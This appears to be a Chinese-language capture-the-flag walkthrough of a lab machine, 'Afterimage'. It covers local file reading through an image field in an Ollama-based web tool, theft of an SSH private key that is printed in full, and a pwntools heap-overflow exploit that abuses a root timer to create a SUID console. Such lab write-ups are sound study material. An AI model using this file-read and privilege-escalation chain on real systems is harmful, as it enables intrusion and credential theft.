---
author: 冰冰洁
title: Afterimage
subtitle: MazeSec 靶场从文件读取到 root 权限提升的完整过程
date: 2026-11-10 16:50
tags:
  - 靶机学习
  - 文件读取
  - 堆溢出
  - 权限提升
---
# 信息收集

![[Pasted image 20261106153108.png]]

发现80端口开启http服务，于是访问查看是否有可用信息

![[Pasted image 20261106161449.png]]

打开发现是一个大模型工具，可上传图片，看到上传图片猜测与文件上传之类的漏洞有关，查看源码，发现一些信息：

![[Pasted image 20261106162139.png]]

![[Pasted image 20261106162258.png]]

`ollama-python `会把⾮ `base64` 的图⽚字符串当成本地路径读取。

因此 `image_url` 填` /etc/passwd `即可测试 `LFI`：

![[Pasted image 20261109152115.png]]

发现确实返回了`/etc/passwd`中的内容

其中，`tlgjm`这个用户存在家目录：

![[Pasted image 20261109152409.png]]

```txt
tlgjm:x:10001:10001::/home/tlgjm:/usr/sbin/nologin
```

这里几个字段分别表示：

|字段|含义|
|---|---|
|tlgjm|用户名|
|x|密码存储在 shadow 文件中|
|10001|UID|
|10001|GID|
|/home/tlgjm|用户家目录|
|/usr/sbin/nologin|默认登录 Shell|y

## 漏洞利用

于是尝试直接使用`LFI`得到该用户的一些信息，首先想到可能存在`ssh`免密登录，看看是否有公私钥：

![[Pasted image 20261109152656.png]]

成功得到用户登录的私钥，于是直接尝试使用这个私钥登录

```bash
 cat > id <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQy
NTUxOQAAACAMjkRt991BTNMIOC5TLRZu0/FHUgjE7e0UW2i3WdX2eQAAAKBWNQ50VjUO
dAAAAAtzc2gtZWQyNTUxOQAAACAMjkRt991BTNMIOC5TLRZu0/FHUgjE7e0UW2i3WdX2eQ
AAAEAmcAkrbGkXB5oSWOrsdKKFMu85zOm8ze/K6C6X4rNgSwyORG333UFM0wg4LlMtFm7T
8UdSCMTt7RRbaLdZ1fZ5AAAAGGFmdGVyaW1hZ2UtdmlzaW9uZGVzay12MgECAwQF
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 id

ssh -i ./id tlgjm@192.168.56.106
```

![[Pasted image 20261109153215.png]]

成功得到用户权限

![[Pasted image 20261109153310.png]]

# root

由于不知道用户的密码，因此不能查看可执行`sudo`命令

查找特殊权限程序,发现以下结果：

![[Pasted image 20261109153956.png]]

和靶机的名字一样，查看用户是否可以执行这个程序：

```bash
find / -perm -4000 -type f 2>/dev/null

ls -l /usr/local/bin/afterimage-recovery
```

![[Pasted image 20261109154339.png]]

进去后发现是一个工单管理程序，包含编辑、预览和提交等三个工作：

![[Pasted image 20261109160052.png]]

默认的工单会交到`review`队列，对应的工作流为`--review`

接下来开始逆向，寻找漏洞点

## 信息收集

首先在靶机上起这个服务：

```bash
cd /usr/local/bin

python3 -m http.server 8000
```

然后使用攻击机将这个程序下载到本地方便逆向分析：

```bash
wget http://192.168.56.106:8000/afterimage-recovery -O ./afterimage-recovery

file afterimage-recovery #查看文件类型

checksec afterimage-recovery  #查看该程序有哪些保护机制
```

![[Pasted image 20261109161329.png]]

## 逆向分析

分析程序文件：

![[Pasted image 20261110143622.png]]

常见可用溢出点总是在写入这类动作的代码里，因此去查看程序中的`1`选项：

![[Pasted image 20261110144639.png]]

这段 `main()` 的核心作用是创建并管理一份工单记录。程序首先通过 `malloc(0x40)` **分配了64字节的 draft 缓冲区**，但后续允许用户输入**最多 `0x200`（512）字节**，并**直接通过 `read()` 写入该缓冲区，输入长度超过 64 字节时就会发生堆溢出**。由于程序随后分配了 `0xf0` 字节的工单记录 `v6`，而它在堆内存中紧跟 draft 缓冲区，溢出的数据就可能覆盖工单的字段。通过分析内存布局，可以发现 draft 起始位置到工单起始位置的偏移是 `0x50`，因此可以利用精心构造的 payload。来改变很多信息。

分析可得几个关键信息的位置：

```
dest + 0x00 queue

dest + 0x08 title

dest + 0x28 workflow

dest + 0xe8 request_id
```

找到溢出点，但是并没有找到哪里可以直接去得到root的终端，于是进一步分析：

![[Pasted image 20261110145202.png]]

这个函数的整体功能是：根据工单的 queue 字段选择目录，以 request_id 命名文件，然后把完整工单保存下来。

`queue` 不是 `repair` 时，请求会写到：

`/var/lib/visiondesk/afterimage/review/request-<id>.bin`

默认工单就是 `queue=review`

`queue=repair` 时

`file_request` 会把工单写入 `/var/lib/visiondesk/afterimage/repair/request-<id>.bin`。

之后 root 运行的定时任务会处理 repair 请求

所以现在去找读取这些工单的文件（可能还是定时的）：

```bash
systemctl list-timers --all

systemctl cat afterimage-recovery.timer

systemctl cat afterimage-recovery-dispatcher.service
```

![[Pasted image 20261110152125.png]]

![[Pasted image 20261110153134.png]]

![[Pasted image 20261110153215.png]]

### 定时器 `afterimage-recovery.timer`

- `OnBootSec=15s`：开机约 15 秒后触发一次。
- `OnUnitActiveSec=5s`：服务激活后约 5 秒再触发。由于服务是 `oneshot`，可以把它理解为大约每隔 5 秒重新运行一次；实际触发时间仍受系统调度影响。
- `Unit=afterimage-recovery-dispatcher.service`：触发的目标服务。
- `WantedBy=timers.target`：安装关系。若定时器已启用，系统启动时会通过 `timers.target` 拉起它。

### 服务 `afterimage-recovery-dispatcher.service`

- `Type=oneshot`：执行一次指定命令，命令结束后服务就结束。
- `ExecStart=...dispatcher.py`：实际运行的 Python 调度程序。
- `User=root`、`Group=root`：程序以 root 用户和组运行。这是权限链中的关键点：它处理请求时拥有系统级权限。
- `After=local-fs.target`：要求本地文件系统相关目标先启动，再运行这个服务。

然后查看这个目录：`/usr/local/libexec/`

尝试使用我们前面发现的`LFI`漏洞去找这个目录下的文件，但是报错：

![[Pasted image 20261110155501.png]]

![[Pasted image 20261110155551.png]]

不能查看完整内容，因此我们让 root helper 处理 repair 请求，并把维护控制台复制成带 SUID 的文件

也就是最后的攻击思路：

```mermaid
flowchart LR
    A["OCR 文件读取漏洞<br/>获取 SSH 私钥"] --> B["SSH 登录普通用户"]
    B --> C["提交 repair 工单"]
    C --> D["root 定时任务处理工单"]
    D --> E["生成 SUID 维护控制台"]
    E --> F["运行控制台，完成提权"]
```

我们需要构造payload使得：

```mermaid
flowchart LR
    A["从 draft 开始写入"] --> B["填充 0x48 字节"]
    B --> C["偏移 0x48：写入 0x101"]
    C --> D["偏移 0x50：覆盖相邻 record"]
    D --> E["写 queue=repair"]
    E --> F["跳过 title 区域"]
    F --> G["写 workflow=--repair"]
    G --> H["提交工单"]
```

## 构造payload


```python
from pwn import *

context.log_level = "debug"

ssh = ["ssh", "-i", "./id", "tlgjm@192.168.56.106"]

payload = (
    b"A" * 0x48
    + p64(0x101)
    + b"repair\x00".ljust(8, b"\x00")
    + b"OCR archive repair".ljust(0x20, b"\x00")
    + b"--repair\x00"
).ljust(0x101, b"\x00")

p = process(ssh + ["/usr/local/bin/afterimage-recovery"])

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"length: ", str(len(payload)).encode())
p.sendafter(b"draft: ", payload)  # 不要追加 b"\n"

p.recvuntil(b"> ", timeout=5)     # 等 draft 保存后出现菜单
p.sendline(b"3")
result = p.recvuntil(b"> ", timeout=5)
print(result.decode("utf-8", errors="replace"))
p.sendline(b"4")
p.close()
```

## 漏洞利用


首先执行上面的攻击脚本，然后去靶机上查看是否存在对应的程序：

```bash
python3 ./exp.py
sleep 7
ls -l /usr/local/libexec/afterimage-maintenance-console
/usr/local/libexec/afterimage-maintenance-console
```

![[Pasted image 20261110165010.png]]

成功

![[Pasted image 20261110165053.png]]
